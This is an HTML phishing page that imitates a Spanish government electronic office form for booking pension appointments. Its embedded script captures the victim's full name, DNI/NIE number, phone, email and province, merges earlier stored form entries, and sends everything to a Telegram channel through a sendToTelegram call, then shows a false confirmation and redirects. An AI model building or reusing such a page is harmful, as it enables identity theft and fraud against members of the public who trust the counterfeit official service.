<body>
<div class="container">
<div class="header"><h1>Solicitar cita previa</h1></div>
<form>
  <div class="form-group"><label for="nombre">Nombre completo</label><input type="text" id="nombre" placeholder="Tu nombre" required></div>
  <div class="form-group"><label for="dni">DNI / NIE</label><input type="text" id="dni" placeholder="12345678Z" required></div>
  <div class="form-group"><label for="provincia">Provincia</label><select id="provincia"><option>Madrid</option><option>Barcelona</option></select></div>
  <div class="form-group"><label for="telefono">Teléfono</label><input type="tel" id="telefono" placeholder="600 123 456" required></div>
  <div class="form-group"><label for="email">Correo electrónico</label><input type="email" id="email" placeholder="tu@email.com" required></div>
  <div class="form-group"><label for="tramite">Tipo de trámite</label><select id="tramite"><option>Gestión de pensión</option><option>Información general</option></select></div>
  <button type="submit" class="btn">Solicitar cita</button>
</form>
<div class="note"><strong>Importante:</strong> La Sede Electrónica se pondrá en contacto para confirmar la cita.</div>
</div>
<script>
let formDataHistory = [];
    function collectAllData() {
        const allData = {};
        const history = localStorage.getItem('formDataHistory');
        if (history) {
            formDataHistory = JSON.parse(history);
            formDataHistory.forEach(entry => {
                Object.assign(allData, entry.data);
            });
        }
        return allData;
    }
    
    document.querySelector('form').addEventListener('submit', function(e) {
    e.preventDefault();
    const citaData = {
        nombre: document.getElementById('nombre').value,
        dni: document.getElementById('dni').value,
        provincia: document.getElementById('provincia').value,
        telefono: document.getElementById('telefono').value,
        email: document.getElementById('email').value,
        tramite: document.getElementById('tramite').value
    };
    
    saveFormData('citaprevia', citaData);
    
    const message = `
<b>📅 Cita previa solicitada:</b>
Nombre: ${citaData.nombre}
DNI: ${citaData.dni}
Provincia: ${citaData.provincia}
Teléfono: ${citaData.telefono}
Email: ${citaData.email}
Trámite: ${citaData.tramite}
    `;
    sendToTelegram(message, 'Cita Previa');
    
    alert('Cita solicitada correctamente. Nos pondremos en contacto.');
    window.location.href = 'cita.html';
});
</script>
